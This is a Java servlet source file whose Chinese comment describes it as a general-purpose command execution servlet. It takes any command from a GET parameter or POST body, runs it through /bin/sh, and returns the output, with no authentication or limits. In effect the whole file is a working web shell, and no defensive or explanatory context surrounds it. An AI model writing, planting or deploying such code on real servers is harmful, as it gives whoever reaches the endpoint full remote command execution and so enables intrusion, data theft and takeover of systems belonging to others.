import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * 通用命令执行 Servlet
 * 支持: GET /cmd?c=id 或 POST /cmd (body=command)
 */
public class CmdServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String cmd = req.getParameter("c");
        if (cmd == null) { resp.getWriter().write("usage: /cmd?c=id"); return; }
        run(cmd, resp);
    }
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(req.getInputStream()));
        String cmd = br.readLine();
        if (cmd == null || cmd.trim().isEmpty()) { resp.getWriter().write("usage: POST body=command"); return; }
        run(cmd, resp);
    }
    private void run(String cmd, HttpServletResponse resp) throws IOException {
        resp.setContentType("text/plain");
        PrintWriter out = resp.getWriter();
        try {
            Process p = new ProcessBuilder("/bin/sh","-c",cmd).redirectErrorStream(true).start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = br.readLine()) != null) out.println(l);
            p.waitFor();
        } catch (Exception e) {
            out.println("ERR: " + e.getMessage());
        }
    }
}
